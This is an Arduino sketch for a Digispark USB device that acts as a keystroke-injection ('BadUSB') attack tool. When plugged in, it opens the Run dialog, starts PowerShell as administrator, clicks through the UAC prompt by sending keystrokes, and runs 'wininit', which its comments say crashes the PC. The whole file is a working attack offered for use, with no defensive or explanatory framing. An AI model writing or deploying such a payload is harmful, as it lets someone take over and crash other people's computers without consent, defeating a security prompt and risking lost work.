#include <DigiKeyboard.h> //includes Digikeyboard.h library
#define KEY_LEFT_ARROW 0x50 //defines the left arrow key 
void setup() { //theres nothing, but its necesary for the program to run 

}
void loop() {
DigiKeyboard.sendKeyStroke(0); //disables all previous user inputs
DigiKeyboard.delay(500); 
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //opens powershell with Win+R
DigiKeyboard.delay(500);
DigiKeyboard.print("powershell"); //types "powershell"
DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT|MOD_SHIFT_LEFT); //runs powershell as administrator
DigiKeyboard.delay(2000);
DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW); //confirm uac prompt
DigiKeyboard.delay(2000);
DigiKeyboard.sendKeyStroke(KEY_ENTER); //presses enter
DigiKeyboard.delay(2000);
DigiKeyboard.print("wininit"); //types "winint" = crashes your PC ;)
DigiKeyboard.sendKeyStroke(KEY_ENTER); //confirms the inevitable ;)
  while (true) //basically blinks the LED when code finishes
  {
    digitalWrite(0, HIGH); //Turn on a digital output (pins 0 and 1 are used for digital output)
    digitalWrite(1, HIGH);
    delay(300);
    digitalWrite(0, LOW); // Turn off the digital output
    digitalWrite(1, LOW);
    delay(300);
  }
}
